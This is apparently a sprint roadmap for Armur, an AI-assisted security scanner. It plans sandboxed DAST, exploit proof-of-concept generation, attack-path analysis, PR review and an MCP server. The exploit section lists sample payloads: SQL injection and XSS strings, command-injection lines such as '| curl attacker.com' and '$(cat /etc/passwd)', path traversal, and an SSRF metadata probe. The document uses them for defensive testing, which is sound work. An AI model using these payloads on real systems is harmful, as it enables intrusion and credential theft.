#### 16.5 `armur explain` — Plain-English Finding Explanation

- [x] `armur explain <finding-id>` CLI command
- [x] Uses the AI provider to generate a targeted explanation:
  - **What it is**: one sentence description of the vulnerability class
  - **Why it matters**: real-world impact and exploitability
  - **Attack scenario**: short realistic attack walkthrough for this specific code context
  - **How to fix**: concrete code change recommendation
- [x] Include the finding's code snippet and file context in the prompt for specificity
- [x] Stream the response to the terminal in real-time (SSE from Claude API)
- [x] Cache explanations locally in SQLite (`~/.armur/history.db`) — reuse for same finding ID
- [x] `armur explain --all --severity high` — bulk explain all HIGH findings in the last scan

#### 16.6 `armur fix` — AI-Generated Code Patches

- [x] `armur fix <finding-id>` CLI command
- [x] Read the affected file from disk, extract ±10 lines of context around the finding's line
- [x] Send to AI provider: `Given this vulnerability in <language>, generate a minimal code patch that fixes only the reported issue without changing functionality`
- [x] Display the diff in the terminal (colored unified diff format using `github.com/pmezard/go-difflib`)
- [x] `armur fix --apply <finding-id>` — apply the patch directly to the file (with backup to `<file>.armur.bak`)
- [x] `armur fix --pr <finding-id>` — apply the patch, stage the change, and create a draft GitHub PR
- [x] Batch mode: `armur fix --all --severity critical --apply` — apply AI fixes for all CRITICAL findings (requires explicit confirmation)

#### 16.7 False Positive Reduction via LLM

- [x] After a scan completes, run MEDIUM-severity findings through an LLM filter:
  - Input: finding details + 15 lines of code context
  - Prompt: "Is this a genuine security finding or a false positive? Rate confidence 0-100."
  - Findings with LLM confidence < 40: mark as `low_confidence`, hide by default (show with `--show-low-confidence`)
- [x] Track false positive rates per tool over time; surface "this tool has 40% FP rate for this rule"
- [x] Configurable: `armur.yml: ai.false-positive-filter: true` (default: false — requires API key)

#### 16.8 Vulnerability Chaining Detection

- [x] Detect cases where multiple LOW/MEDIUM findings together form a higher-risk attack chain:
  - Example: SSRF (MEDIUM) + credentials in env var (MEDIUM) → Remote credential theft (HIGH/CRITICAL)
  - Example: Path traversal (MEDIUM) + file read in same function → file disclosure (HIGH)
- [x] Implement a rule engine in `internal/analysis/chains.go` with hand-crafted chaining rules
- [x] LLM augmentation: send clusters of findings from the same file to the AI provider for chain analysis
- [x] Display chains as a separate `vulnerability_chain` category in results

#### 16.9 Natural Language Scan Configuration

- [x] `armur run --ask "scan only for SQL injection and hardcoded credentials"` flag
- [x] Parse the natural language instruction with AI provider → convert to a structured `.armur.yml` fragment
- [x] Apply the generated config for the current scan run only (do not persist)

#### 16.10 `--offline` Mode & Local Vulnerability Database

- [x] `--offline` global flag: when set, Armur makes zero external network calls
  - No AI API calls (use Ollama if running; otherwise AI features disabled)
  - No OSV API queries (use local vulnerability database cache if available)
  - No badge server pings
  - No telemetry (already off by default; this makes it explicit)
  - Scan still runs fully; only AI features and online lookups are disabled
- [x] `.armur.yml: offline: true` — project-level offline enforcement
- [x] `ARMUR_OFFLINE=true` env var — enforcement for CI environments without outbound internet
- [x] `armur db update` — download the OSV vulnerability database to `~/.armur/vuln-db/` (SQLite)
  - Downloads all OSV advisories for Go, npm, PyPI, crates.io, Maven, RubyGems, etc.
  - Database size: ~300MB for all ecosystems; supports incremental updates
- [x] `armur db update --ecosystem go,npm` — update only specific ecosystems
- [x] SCA checks in `--offline` mode use the local DB instead of the OSV API
- [x] Show DB freshness warning if local DB is > 24h old when running SCA scans
- [x] Auto-update DB in the background (daily, configurable) when online
- [x] Zero telemetry by default — Armur never phones home
- [x] `--privacy-audit` flag: print a list of every network call that *would* be made during a scan

---

### Sprint 17 — Sandboxed DAST [DONE]: Intelligent Runtime Testing

Full-blown DAST that goes far beyond "scan a URL." Armur auto-detects the tech stack, creates an
isolated sandbox, builds and runs the application, waits for it to be healthy, then hammers it
with dynamic security tests. This is the feature that makes Armur a true security agent.

#### 17.1 Sandbox Environment Engine

- [x] Create `internal/sandbox/sandbox.go` — manages isolated execution environments:
  ```go
  type Sandbox struct {
      ID          string
      ProjectPath string
      TechProfile TechProfile
      ContainerID string
      Port        int
      BaseURL     string
      Status      string  // "creating", "building", "running", "healthy", "failed", "destroyed"
  }

  func Create(ctx context.Context, projectPath string, profile TechProfile) (*Sandbox, error)
  func (s *Sandbox) Build(ctx context.Context) error
  func (s *Sandbox) Start(ctx context.Context) error
  func (s *Sandbox) WaitHealthy(ctx context.Context, timeout time.Duration) error
  func (s *Sandbox) BaseURL() string
  func (s *Sandbox) Destroy(ctx context.Context) error
  ```
- [x] Sandbox uses Docker to isolate the application:
  - Auto-generate a `Dockerfile` if one doesn't exist (using AI tech detection results)
  - Build the application inside the container
  - Run it with network isolation (only accessible from the host)
  - Map the application port to a random available host port
- [x] For Docker Compose projects: use `docker compose up` instead of building a single container
- [x] Resource limits: CPU (2 cores max), memory (2GB max), disk (5GB max), network (no external access)
- [x] Timeout: sandbox auto-destroys after 10 minutes (configurable via `dast.sandbox_timeout` in `.armur.yml`)
- [x] Cleanup: always destroy sandbox on completion, cancellation, or error (defer-based)

#### 17.2 Intelligent Dockerfile Generation

- [x] When no Dockerfile exists, use the `TechProfile` from Sprint 16.4 to generate one:
  - **Go**: `golang:1.22-alpine` → `go build` → `scratch` or `alpine` runtime
  - **Python (Flask/FastAPI/Django)**: `python:3.12-slim` → `pip install -r requirements.txt` → `CMD`
  - **Node.js (Express/Next.js/Nest)**: `node:20-slim` → `npm install` → `npm start`
  - **Java (Spring Boot)**: `maven:3.9-eclipse-temurin-21` → `mvn package` → `openjdk:21-jre-slim`
  - **Ruby (Rails)**: `ruby:3.3-slim` → `bundle install` → `rails server`
  - **Rust**: `rust:1.76` → `cargo build --release` → `debian:bookworm-slim`
  - **PHP (Laravel)**: `php:8.3-fpm` → `composer install` → with nginx sidecar
- [x] AI-enhanced Dockerfile generation: send project structure to AI provider and ask for optimal Dockerfile
- [x] If AI is not available: use template-based generation from the detected framework
- [x] Store generated Dockerfile in `~/.armur/sandbox/<sandbox-id>/Dockerfile` (not in the project)
- [x] Handle projects with `docker-compose.yml`: parse it, identify the main service, use existing compose

#### 17.3 Application Health Detection

- [x] After starting the sandbox, probe for application readiness:
  1. TCP connect to the mapped port (retry every 500ms, max 60s)
  2. HTTP GET `/` — check for any non-connection-error response
  3. HTTP GET common health endpoints: `/health`, `/healthz`, `/api/health`, `/ping`, `/ready`
  4. If health check path detected in code (via grep/AI): use that specific endpoint
- [x] Parse application stdout for startup messages: "Listening on port", "Server started", "Ready to accept connections"
- [x] If the app fails to start: capture stdout/stderr, report as a finding:
  "Application failed to start in sandbox — DAST could not be performed. Build error: [...]"
- [x] If AI is available: analyze the build/startup failure and suggest a fix

#### 17.4 Dynamic Security Testing Suite

- [x] Once the app is healthy, run a layered DAST test suite:

  **Layer 1 — Passive Discovery (always runs, <30s):**
  - Spider/crawl the application from the root URL using a headless crawler
  - Discover all routes, forms, API endpoints, authentication pages
  - Detect technology headers (X-Powered-By, Server, framework fingerprints)
  - Check security headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
  - Check cookie attributes: HttpOnly, Secure, SameSite
  - Check CORS configuration: open `*` origins, credential leaks

  **Layer 2 — Active Probing (opt-in or auto for non-prod, ~2-5min):**
  - SQL injection probes on all detected input parameters (forms, query params, JSON bodies)
  - XSS probes: reflected and stored XSS payloads on all input points
  - Command injection probes on parameters that could reach exec paths
  - Path traversal probes (`../../etc/passwd`) on file-related parameters
  - SSRF probes: inject internal IP addresses in URL-accepting parameters
  - Authentication bypass: try accessing protected endpoints without auth headers
  - IDOR probes: iterate sequential IDs on resource endpoints
  - Rate limiting check: send 100 rapid requests to login endpoint
  - Error disclosure: trigger errors and check for stack traces / debug info in responses

  **Layer 3 — Known CVE Exploitation (via Nuclei, ~1-2min):**
  - Run Nuclei against the sandbox URL with templates matching the detected tech stack
  - Focus on: framework CVEs, exposed admin panels, default credentials, misconfiguration
  - `nuclei -u <sandbox-url> -t cves/ -t exposed-panels/ -t misconfigurations/ -severity medium,high,critical -j`

  **Layer 4 — ZAP Deep Scan (opt-in, ~5-10min):**
  - If ZAP is available and depth=deep: run ZAP active scan
  - `docker run owasp/zap2docker-stable zap-full-scan.py -t <sandbox-url> -J results.json`
  - Merge ZAP findings with Armur findings, deduplicating by endpoint+vulnerability type

- [x] All DAST findings tagged with `Finding.Source = "dast"` and `Finding.Confirmed = true`
- [x] DAST findings include the HTTP request/response that triggered the vulnerability

#### 17.5 CLI Integration

- [x] `armur dast <path>` — run DAST against a local project:
  1. Detect tech stack (AI or heuristic)
  2. Create sandbox
  3. Build and start application
  4. Run DAST test suite
  5. Destroy sandbox
  6. Display findings
- [x] `armur scan <path> --dast` — add DAST to a regular SAST scan (runs SAST first, then DAST)
- [x] `armur scan <path> --full-agent` — SAST + SCA + DAST + Exploit Simulation (Sprint 18)
- [x] `armur dast --url <url>` — run DAST against an already-running service (skip sandbox creation)
- [x] Progress display during DAST: show sandbox status, test layer progress, findings as they arrive
- [x] `.armur.yml` DAST configuration:
  ```yaml
  dast:
    enabled: true
    auto_sandbox: true        # auto-create sandbox (false = require --url)
    layers: [passive, active, nuclei]  # which layers to run (default: all except zap)
    sandbox_timeout: 600      # seconds before sandbox auto-destroys
    port_hint: 8080           # hint for which port the app listens on
    env:                      # environment variables for the sandbox
      DATABASE_URL: "sqlite:///tmp/test.db"
      SECRET_KEY: "test-secret-for-dast"
    auth:                     # authentication for protected endpoints
      type: bearer            # bearer | basic | form | cookie
      token: "${DAST_TOKEN}"  # use env var for secrets
    exclude_paths:            # don't test these paths
      - /admin/delete-all
      - /api/v1/dangerous-endpoint
  ```

---

### Sprint 18 — Exploit Simulation [DONE] & Proof-of-Concept Engine

Move beyond "we found a vulnerability" to "here's exactly how an attacker exploits it."
Armur generates safe, sandboxed exploit proof-of-concepts that confirm SAST findings are real
and show developers the actual impact. This transforms theoretical findings into visceral,
undeniable evidence.

#### 18.1 Exploit Generation Engine

- [x] Create `internal/exploit/generator.go` — generates PoC exploits from findings:
  ```go
  type ExploitPoC struct {
      FindingID   string   `json:"finding_id"`
      Type        string   `json:"type"`        // "sql_injection", "xss", "rce", etc.
      Description string   `json:"description"` // what the exploit does
      Steps       []Step   `json:"steps"`       // ordered attack steps
      Payload     string   `json:"payload"`     // the actual exploit payload
      HTTPRequest *HTTPReq `json:"http_request,omitempty"` // for web exploits
      Script      string   `json:"script"`      // executable PoC script (bash/python)
      Impact      string   `json:"impact"`      // what an attacker gains
      Severity    string   `json:"severity"`    // confirmed severity after simulation
  }
  ```
- [x] **Template-based exploit generation** (works without AI):
  - SQL injection: generate payloads for the specific database type detected (PostgreSQL, MySQL, SQLite)
    - Union-based extraction: `' UNION SELECT username, password FROM users --`
    - Boolean-based blind: `' AND 1=1 --` vs `' AND 1=2 --`
    - Time-based blind: `'; WAITFOR DELAY '0:0:5' --`
  - XSS: generate context-aware payloads (HTML context, attribute context, JavaScript context)
    - Reflected: `<script>alert(document.cookie)</script>`
    - DOM-based: `javascript:alert(1)` in URL fragments
  - Command injection: generate OS-specific payloads (Linux/Windows)
    - `; id`, `` `whoami` ``, `$(cat /etc/passwd)`, `| curl attacker.com`
  - Path traversal: `../../etc/passwd`, `..\..\windows\system32\drivers\etc\hosts`
  - SSRF: `http://169.254.169.254/latest/meta-data/` (AWS metadata)
  - Deserialization: language-specific gadget chains
  - Auth bypass: JWT none algorithm, SQL injection in login, default credentials

- [x] **AI-enhanced exploit generation** (when AI provider available):
  - Send the finding context (code snippet, endpoint, parameter) to the AI
  - Prompt: "Generate a safe, sandboxed proof-of-concept exploit for this [vulnerability type] in [language/framework]. The PoC should demonstrate impact without causing real damage. Include the exact HTTP request or code to reproduce."
  - AI generates more sophisticated, context-aware exploits than templates
  - Validate AI output: ensure it doesn't contain destructive payloads (no `rm -rf`, no actual data exfiltration to external URLs)

#### 18.2 Safe Exploit Execution

- [x] Exploits ONLY run inside the sandbox from Sprint 17 (never against production)
- [x] Create `internal/exploit/runner.go` — executes PoCs safely:
  ```go
  type ExploitResult struct {
      PoCID       string `json:"poc_id"`
      Success     bool   `json:"success"`      // did the exploit work?
      Evidence    string `json:"evidence"`      // what happened (response body, output, etc.)
      Screenshot  string `json:"screenshot"`    // base64 screenshot if web-based
      HTTPLog     []HTTPExchange `json:"http_log"` // full request/response log
      Severity    string `json:"confirmed_severity"` // severity after confirmation
  }
  ```
- [x] Execution isolation:
  - All exploit HTTP requests go only to the sandbox URL (enforce via URL validation)
  - No network access to external hosts from exploit scripts
  - Exploit scripts run inside a separate container (not the same as the app sandbox)
  - 30-second timeout per exploit attempt
  - Capture all HTTP traffic (request + response) as evidence
- [x] Severity escalation: if a MEDIUM SAST finding is confirmed exploitable → escalate to HIGH or CRITICAL
- [x] Severity downgrade: if exploit fails → add `Finding.ExploitResult = "not_exploitable"` (doesn't remove the finding, but lowers priority)

#### 18.3 Exploit Report & Evidence

- [x] Each confirmed exploit generates an evidence package:
  - The exact HTTP request(s) that triggered the vulnerability
  - The server response proving exploitation (e.g., extracted data, error message, timing difference)
  - Step-by-step reproduction instructions
  - Remediation: specific code change to fix the vulnerability
- [x] Display in CLI:
  ```
  ┌─────────────────────────────────────────────────────┐
  │  [CONFIRMED] SQL Injection — api/handlers.go:42     │
  │  Severity: CRITICAL (confirmed via exploit)         │
  ├─────────────────────────────────────────────────────┤
  │  Exploit: Union-based SQL injection via 'id' param  │
  │  Request: POST /api/users?id=1' UNION SELECT...     │
  │  Impact:  Full database read access                 │
  │  Fix:     Use parameterized query (see suggestion)  │
  └─────────────────────────────────────────────────────┘
  ```
- [x] HTML report includes exploit evidence as collapsible sections with syntax-highlighted HTTP logs
- [x] `armur exploit <finding-id>` — generate and run an exploit for a specific finding

#### 18.4 Exploit Simulation Modes

- [x] **Auto mode** (default in `full_agent`): automatically attempt exploits for all HIGH/CRITICAL SAST findings that have DAST-reachable endpoints
- [x] **Manual mode**: `armur exploit <finding-id>` — run a specific exploit interactively
- [x] **Dry-run mode**: `armur exploit --dry-run` — generate exploit PoCs and show what would be attempted, but don't execute them
- [x] **CI mode**: `armur scan --full-agent --exploit-confirm` — run exploits in CI pipeline, fail on confirmed exploits
- [x] `.armur.yml` configuration:
  ```yaml
  exploit:
    enabled: false            # opt-in (default off for safety)
    auto_for_severity: high   # auto-exploit findings at this severity or above
    max_attempts: 5           # max exploit attempts per finding
    timeout_per_exploit: 30   # seconds
    dry_run: false            # generate but don't execute
  ```

---

### Sprint 19 — Attack Path Analysis [DONE] & Visualization

Individual findings are noise. Attack paths are signal. This sprint connects findings into attack
graphs that show developers: "An attacker starts here, chains these 3 issues, and ends up with
full database access." This is what converts a vulnerability report into a story that drives action.

#### 19.1 Attack Graph Construction

- [x] Create `internal/attackpath/graph.go`:
  ```go
  type AttackGraph struct {
      Nodes []AttackNode `json:"nodes"`
      Edges []AttackEdge `json:"edges"`
      Paths []AttackPath `json:"paths"`
  }

  type AttackNode struct {
      ID        string   `json:"id"`
      FindingID string   `json:"finding_id,omitempty"` // links to a Finding
      Type      string   `json:"type"`     // "entry_point", "vulnerability", "privilege", "asset"
      Label     string   `json:"label"`
      Severity  string   `json:"severity"`
  }

  type AttackEdge struct {
      From      string `json:"from"`
      To        string `json:"to"`
      Label     string `json:"label"`   // "exploits", "leads_to", "escalates_to", "accesses"
      Technique string `json:"technique"` // MITRE ATT&CK technique ID if applicable
  }

  type AttackPath struct {
      ID          string   `json:"id"`
      Name        string   `json:"name"`        // "Unauthenticated DB Access via SQLi"
      Severity    string   `json:"severity"`     // highest severity in the path
      NodeIDs     []string `json:"node_ids"`     // ordered path through the graph
      Impact      string   `json:"impact"`       // what the attacker achieves
      Likelihood  string   `json:"likelihood"`   // high/medium/low based on complexity
      Description string   `json:"description"`  // narrative description
  }
  ```
- [x] **Entry point detection**: identify attack surface from the code:
  - HTTP endpoints (parsed from router definitions: Gin, Express, Flask, Spring, etc.)
  - CLI argument handlers
  - File upload handlers
  - WebSocket handlers
  - Message queue consumers
  - Cron jobs with external input
- [x] **Vulnerability chaining rules** (hand-crafted + AI-augmented):
  - SSRF + cloud metadata endpoint → credential theft → lateral movement
  - SQL injection + admin table → authentication bypass → full data access
  - XSS + session cookie without HttpOnly → session hijacking → account takeover
  - Path traversal + config file read → credential disclosure → privilege escalation
  - Insecure deserialization + network access → remote code execution
  - Weak JWT + no audience validation → token forgery → impersonation
  - Command injection + network access → reverse shell → full system compromise
  - Dependency vulnerability (known RCE CVE) + internet-facing service → pre-auth RCE
- [x] Build the graph automatically after SAST + DAST results are collected
- [x] When AI is available: send findings to AI for additional chain discovery that rules can't catch

#### 19.2 Attack Path Scoring

- [x] Score each attack path based on:
  ```
  path_score = base_impact_score
             × chain_complexity_factor    (fewer steps = higher score)
             × confirmation_multiplier    (2.0 if any step is DAST-confirmed, 1.0 otherwise)
             × exposure_factor            (1.5 if entry point is internet-facing, 1.0 if internal)
             × authentication_factor      (1.5 if no auth required, 1.0 if auth required)
  ```
- [x] Rank paths by score; present the top 5 as the "critical attack paths"
- [x] Add `Finding.AttackPaths []string` — list of attack path IDs that include this finding
- [x] Findings that appear in multiple attack paths get a priority boost

#### 19.3 Visualization: Mermaid Diagrams

- [x] Generate Mermaid flowchart syntax for each attack path:
  ```mermaid
  graph LR
    A[Internet User] -->|POST /api/search| B[Search Endpoint]
    B -->|SQLi in 'query' param| C[SQL Injection]
    C -->|UNION SELECT| D[Database Read Access]
    D -->|Extract users table| E[Credential Theft]
    E -->|Admin password| F[Admin Panel Access]
    style C fill:#ff4444
    style E fill:#ff4444
    style F fill:#ff0000
  ```
- [x] Include Mermaid diagrams in:
  - HTML reports (rendered via Mermaid.js CDN or inline SVG)
  - Markdown reports (raw Mermaid code blocks — GitHub renders them natively)
  - CLI output (as ASCII-art graph using box-drawing characters)
- [x] `armur attack-paths --task <id>` — display attack paths with ASCII visualization
- [x] `armur attack-paths --task <id> --format mermaid` — output raw Mermaid for pasting into docs

#### 19.4 Interactive Attack Path Browser (TUI)

- [x] Extend the Bubbletea TUI (Sprint 7) with an "Attack Paths" tab:
  - Left panel: list of attack paths sorted by score, with severity badge
  - Right panel: ASCII graph visualization of the selected path
  - Press Enter on a path → expand to show each node's finding details
  - Press `m` → copy Mermaid diagram to clipboard
  - Press `e` → export attack path as SVG (render Mermaid locally if `mmdc` is installed)
- [x] Summary card includes attack path count: "3 critical attack paths identified"

#### 19.5 Attack Path in CI/CD

- [x] `--fail-on-attack-path` flag: fail the CI build if any attack path with score above threshold exists
- [x] Attack paths included in SARIF output as related locations (GitHub Code Scanning shows the chain)
- [x] PR comment (when GitHub App is integrated) includes the top attack path:
  ```
  ## Attack Path Detected
  **Unauthenticated Database Access** (Critical)
  Internet → POST /api/search → SQL Injection (search.go:42) → Database Read → Credential Theft

  This PR introduces a SQL injection that enables full database access without authentication.
  ```

---

### Sprint 20 — PR Security Agent [DONE]: Autonomous Code Review

The crown jewel. Armur acts as an autonomous security reviewer on every pull request. It reads
the diff, runs SAST on the changes, spins up a sandbox for DAST, simulates exploits, maps attack
paths, and posts a comprehensive security review — all without any human intervention. This is
what "Personal Security Agent" means in practice.

#### 20.1 PR Review Engine

- [x] Create `internal/agent/pr_review.go` — the PR review orchestrator:
  ```go
  type PRReview struct {
      PRURL       string
      BaseBranch  string
      HeadBranch  string
      ChangedFiles []string
      SASTFindings []Finding
      DASTFindings []Finding
      ExploitResults []ExploitResult
      AttackPaths  []AttackPath
      AICommentary string     // AI-generated review narrative
      Verdict      string     // "approve", "request_changes", "comment"
  }

  func ReviewPR(ctx context.Context, prURL string, opts ReviewOpts) (*PRReview, error)
  ```
- [x] Review pipeline:
  1. **Fetch PR diff**: clone repo, checkout PR branch, compute changed files vs base
  2. **SAST scan**: run full SAST on changed files only (diff mode)
  3. **SCA check**: check if any new dependencies were added; run vulnerability check on new deps only
  4. **Secrets scan**: scan the diff for newly introduced secrets (not existing ones)
  5. **DAST** (if applicable): if the PR changes API endpoints or adds new routes:
     - Build sandbox from the PR branch
     - Run DAST against the sandbox
     - Focus tests on endpoints modified in the PR
  6. **Exploit simulation** (if enabled): attempt exploits for any HIGH/CRITICAL findings
  7. **Attack path analysis**: check if the PR introduces new attack paths or extends existing ones
  8. **AI review narrative**: use AI provider to generate a developer-friendly review summary
  9. **Verdict determination**: auto-approve if no HIGH/CRITICAL findings; request changes otherwise

#### 20.2 GitHub PR Integration

- [x] `armur review <pr-url>` CLI command:
  - Accepts GitHub PR URL: `armur review https://github.com/owner/repo/pull/123`
  - Runs the full review pipeline locally
  - Prints results to terminal
  - Optionally posts review comment: `armur review <pr-url> --post-comment`
- [x] GitHub App webhook handler (extends Sprint 23):
  - On `pull_request.opened` / `pull_request.synchronize`: automatically trigger review
  - Post review as a GitHub PR review (not just a comment):
    - Inline comments on specific lines where findings are located
    - Review summary at the top with severity table + attack paths
    - Review verdict: "Approve" / "Request Changes" based on findings
- [x] PR review comment format:
  ```markdown
  ## Armur Security Review

  **Verdict: Request Changes** — 2 critical issues found

  ### Summary
  | Category | New Findings |
  |----------|-------------|
  | Critical | 1 |
  | High | 1 |
  | Medium | 3 |
  | Security Score | 42/100 (was 78/100 on main) |

  ### Critical Attack Path
  This PR introduces a SQL injection in `search.go:42` that enables unauthenticated
  database access. See inline comments for details.

  ### DAST Results
  Sandbox test passed for 12/15 endpoints
  3 endpoints vulnerable (see inline comments)

  ### What to Fix
  1. Use parameterized query in `search.go:42` (see suggested fix)
  2. Add input validation for `userID` parameter in `users.go:87`

  ---
  Reviewed by [Armur Security Agent](https://armur.ai)
  ```

#### 20.3 AI-Generated Review Narrative

- [x] After all analysis is complete, send the full finding set to the AI provider:
  - Prompt: "You are a senior security engineer reviewing a pull request. Based on these findings, write a clear, actionable review. Focus on: what's most dangerous, why it matters, and exactly how to fix it. Be direct but not condescending."
  - Include: PR description, changed files summary, all findings with code context
  - The AI narrative is the "voice" of the security agent — it should sound like a helpful colleague
- [x] Tone configuration in `.armur.yml`:
  ```yaml
  agent:
    review_tone: helpful     # helpful | strict | minimal
  ```
  - `helpful`: full explanations with fix suggestions (default)
  - `strict`: just the facts, no suggestions (for compliance-focused teams)
  - `minimal`: one-line per finding, verdict only

#### 20.4 Continuous PR Watching

- [x] `armur agent --watch-prs` — continuously watch for new PRs and review them automatically
  - Requires GitHub App installation or a personal access token
  - Polls for new PRs every 60 seconds (configurable)
  - Reviews each new PR and update automatically
  - Runs as a background daemon: `armur agent --watch-prs --daemon`
- [x] GitLab MR support: `armur agent --watch-mrs --gitlab-url <url> --token <token>`
- [x] Status: show active watchers in `armur status`:
  ```
  Armur Security Agent — Active
  Watching: github.com/myorg/myapp (3 PRs reviewed today)
  Last review: PR #142 — 2 findings, Request Changes
  ```

#### 20.5 PR Review in CI/CD

- [x] GitHub Actions integration:
  ```yaml
  - uses: armur-ai/armur-action@v2
    with:
      mode: pr-review
      post-review: true
      fail-on-severity: high
      dast: true
      exploit-simulation: false  # opt-in for CI
    env:
      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
  ```
- [x] GitLab CI template:
  ```yaml
  armur-review:
    image: armur/agent:latest
    script:
      - armur review --post-comment --fail-on-severity high
    rules:
      - if: $CI_PIPELINE_SOURCE == "merge_request_event"
  ```
- [x] Support for all CI platforms from Sprint 25 (CircleCI, Jenkins, Azure DevOps, Bitbucket)

---

### Sprint 21 — MCP Server [DONE]: Native AI Assistant Integration

The Model Context Protocol (MCP) is how AI coding assistants (Claude Code, Cursor, Windsurf, Claude
Desktop) call external tools. Armur as an MCP server means every developer using an AI assistant
gets Armur's scanning capabilities built directly into their coding workflow — zero extra steps.
This is the highest-leverage distribution play available right now.

#### 21.1 Core MCP Server Implementation

- [x] Add `armur mcp` command — starts Armur as an MCP server over stdio (standard Claude Code transport)
- [x] Use `github.com/mark3labs/mcp-go` as the MCP SDK (or implement the JSON-RPC 2.0 protocol directly)
- [x] Implement MCP `initialize` handshake: declare server name `armur`, version, and capabilities
- [x] Implement the following **MCP Tools** (functions Claude can call):

  **Scanning tools:**
  - `armur_scan_path` — scan a local file or directory
    - Input: `{ "path": string, "depth": "quick"|"deep" (optional) }`
    - Output: `{ "task_id": string, "findings": Finding[], "summary": ScanSummary }`
    - Runs in-process (no server required) for lowest latency
  - `armur_scan_code` — scan a code snippet without touching the filesystem (for inline use)
    - Input: `{ "code": string, "language": string, "filename": string (optional) }`
    - Output: `{ "findings": Finding[], "summary": ScanSummary }`
    - Writes to temp file, runs semgrep + language tools, returns findings, deletes temp file
  - `armur_scan_git_history` — scan git history for leaked secrets
    - Input: `{ "path": string, "depth": "full"|"recent" }` (`"recent"` = last 100 commits)
    - Output: `{ "findings": Finding[] }`

  **Finding intelligence tools:**
  - `armur_explain_finding` — explain a specific finding in plain English with attack scenario
    - Input: `{ "finding_id": string }` or `{ "finding": Finding }` (inline finding object)
    - Output: `{ "explanation": string, "attack_scenario": string, "remediation": string }`
  - `armur_fix_finding` — generate a code patch for a finding
    - Input: `{ "finding_id": string, "code_context": string (10 lines around the issue) }`
    - Output: `{ "patch": string (unified diff format), "explanation": string }`
  - `armur_check_dependency` — check if a specific package version has known vulnerabilities
    - Input: `{ "package": string, "version": string, "ecosystem": "npm"|"pip"|"go"|"cargo"|... }`
    - Output: `{ "vulnerabilities": Vulnerability[], "safe": bool, "fix_version": string }`

  **History & status tools:**
  - `armur_get_history` — get recent scan history for a path
    - Input: `{ "path": string (optional), "limit": int (default: 5) }`
    - Output: `{ "scans": ScanSummary[] }`
  - `armur_get_posture_score` — get the security posture score for a path
    - Input: `{ "path": string }`
    - Output: `{ "score": int, "grade": string, "breakdown": SeverityBreakdown }`

- [x] Implement MCP **Resources** (data Claude can read without calling a tool):
  - `armur://findings/latest` — findings from the most recent scan of cwd
  - `armur://posture` — current posture score for cwd
  - `armur://history` — last 10 scan summaries
- [x] Implement MCP **Prompts** (reusable prompt templates Claude can invoke):
  - `security_review` — "Review the following code for security vulnerabilities using Armur"
  - `fix_vulnerabilities` — "Fix all HIGH and CRITICAL vulnerabilities found by Armur in this file"
  - `explain_findings` — "Explain the Armur findings in this scan in developer-friendly language"

#### 21.2 Claude Code Integration

- [x] Write `docs/integrations/claude-code.md` with step-by-step setup:
  ```json
  // Add to ~/.claude/settings.json (or use: claude mcp add armur -- armur mcp)
  {
    "mcpServers": {
      "armur": {
        "command": "armur",
        "args": ["mcp"],
        "env": { "ARMUR_API_KEY": "<your-key>" }
      }
    }
  }
  ```
- [x] One-liner setup command: `armur setup claude-code` — writes the MCP config automatically to the correct Claude Code settings file
- [x] Verify the integration: `armur setup claude-code --verify` — starts the MCP server, sends a test tool call, confirms it responds correctly
- [x] Generate a `CLAUDE.md` snippet users can add to their project:
  ```markdown
  ## Security Policy
  This project uses Armur for security scanning. Before suggesting code changes:
  1. Use `armur_scan_code` to check new code for vulnerabilities
  2. Use `armur_check_dependency` before suggesting new package additions
  3. Address any HIGH or CRITICAL findings before finalizing suggestions
  4. Use `armur_explain_finding` if a finding needs clarification
  ```
- [x] `armur setup claude-code --add-project-md` — appends the above snippet to `CLAUDE.md` in cwd

#### 21.3 Cursor Integration

- [x] Write `docs/integrations/cursor.md` — Cursor supports MCP via the same `~/.cursor/mcp.json` config format
- [x] `armur setup cursor` — writes MCP config to `~/.cursor/mcp.json`
- [x] Cursor-specific prompt template: "When writing code, automatically check for security issues using Armur tools"
- [x] Test the Cursor integration end-to-end; document known limitations (Cursor MCP differences)

#### 21.4 Windsurf Integration

- [x] Write `docs/integrations/windsurf.md`
- [x] `armur setup windsurf` — writes config to Windsurf's MCP config path
- [x] Test and document Windsurf-specific behavior

#### 21.5 Claude Desktop Integration

- [x] Write `docs/integrations/claude-desktop.md`
- [x] `armur setup claude-desktop` — writes to `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS) or equivalent on Windows/Linux
- [x] Desktop-specific use case: scan repos you're reviewing without an editor open

#### 21.6 MCP Server Performance & Reliability

- [x] `armur_scan_path` must complete in < 5 seconds for `depth: "quick"` on a typical project (use in-process mode)
- [x] `armur_scan_code` must complete in < 2 seconds for a single file (semgrep only, no heavy tools)
- [x] MCP server logs errors to stderr (visible in Claude Code's MCP debug output)
- [x] Graceful error handling: if a tool is not installed, return a helpful error message instead of crashing
- [x] Add integration tests that start the MCP server and call each tool via the MCP protocol

---
## Phase 4: Distribution & Community (v2.5) — Sprints 22–32

Get Armur into every developer's hands. Homebrew, npm, pip, winget, Docker, GitHub App,
VS Code extension, CI/CD for every platform, onboarding, analytics, Slack/Teams, SaaS, and community.

---

### Sprint 22 — Zero-Friction Distribution [DONE] (Every Platform, One Command)

A tool is only as good as how easy it is to install. Every developer should be able to go from
"I heard about Armur" to running their first scan in under 60 seconds, on any platform.

#### 22.1 Homebrew (macOS & Linux — Primary Channel)

- [ ] Create `armur-ai/homebrew-tap` GitHub repository
- [ ] Write `Formula/armur.rb` Homebrew formula:
  - Downloads pre-built binary from GitHub Releases based on OS and arch
  - Installs to `/opt/homebrew/bin/armur` (Apple Silicon) or `/usr/local/bin/armur` (Intel)
  - Includes shell completion setup in the formula's `caveats` section
- [ ] Test formula installation on macOS (arm64 + x86_64) and Linux (x86_64)
- [ ] Publish: `brew install armur-ai/tap/armur`
- [ ] Submit to Homebrew Core (after meeting minimum formula requirements: 75+ stars, stable release)
- [ ] `armur update` self-update: `brew upgrade armur` under the hood when installed via Homebrew

#### 22.2 npm Global Package (JavaScript/TypeScript Developer Channel)

- [ ] Create `packages/armur-cli` npm package:
  - `package.json` with `bin: { "armur": "bin/armur.js" }`
  - `postinstall` script: detect OS/arch, download the correct Go binary from GitHub Releases, place in `node_modules/.bin/`
  - Inspired by how `esbuild`, `turbo`, and `@biomejs/biome` distribute native binaries via npm
- [ ] Publish to npm: `npm install -g @armur/cli` or `npx @armur/cli scan .` (no install needed)
